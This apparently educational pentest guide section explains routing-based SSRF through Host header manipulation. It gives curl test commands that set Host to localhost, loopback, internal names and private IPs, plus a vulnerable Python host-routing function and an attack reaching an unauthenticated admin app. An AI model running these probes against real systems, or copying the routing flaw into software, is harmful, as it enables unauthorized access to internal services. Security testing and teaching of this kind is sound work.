# 2.3 Routing-Based SSRF

## Goal

Use Host header to manipulate backend routing and access internal services.

---

## How It Works

```
1. Host header controls backend routing
2. Attacker sets Host: localhost or 127.0.0.1
3. Server routes request internally
4. Accesses admin panel or internal services
5. Bypasses authentication via routing
```

---

## Test Cases

### Test 1: Localhost
```bash
curl -H "Host: localhost" https://target.com/admin
```

### Test 2: Loopback IP
```bash
curl -H "Host: 127.0.0.1" https://target.com/admin
```

### Test 3: Internal Names
```bash
curl -H "Host: internal" https://target.com/
curl -H "Host: admin" https://target.com/
curl -H "Host: backend" https://target.com/
```

### Test 4: Private IPs
```bash
curl -H "Host: 192.168.1.1" https://target.com/
curl -H "Host: 10.0.0.1" https://target.com/
curl -H "Host: 172.16.0.1" https://target.com/
```

---

## Real-World Scenario

**Vulnerable code:**
```python
def route_request(host):
    if host == "localhost":
        return admin_app
    elif host == "internal":
        return internal_tools
    else:
        return main_app

app = route_request(request.host)
return app.handle(request)
```

**Attack:**
```bash
curl -H "Host: admin" https://target.com/admin
# Routes to admin_app despite coming from external
# No authentication check
# Access granted!
```
